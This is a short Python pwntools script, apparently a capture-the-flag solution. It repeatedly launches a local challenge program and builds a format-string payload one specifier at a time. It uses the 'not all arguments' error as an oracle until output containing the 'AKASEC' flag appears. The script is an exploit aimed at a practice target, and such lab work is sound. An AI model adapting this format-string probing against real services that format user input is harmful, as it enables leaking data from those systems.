from pwn import *

def send(payload):
    s = process(["python3", "chall.py"])
    s.recvuntil(b": ")
    s.sendline(payload.encode())
    ret = s.recvall().decode()
    s.close()
    return ret

payload = ""
while True:
    for c in ["%f", "%d", "%s", "%r"]:
        ret = send(payload + c)
        if "not all arguments" in ret:
            payload += c
            break
        if "AKASEC" in ret:
            print(ret)
            exit()
    print(payload)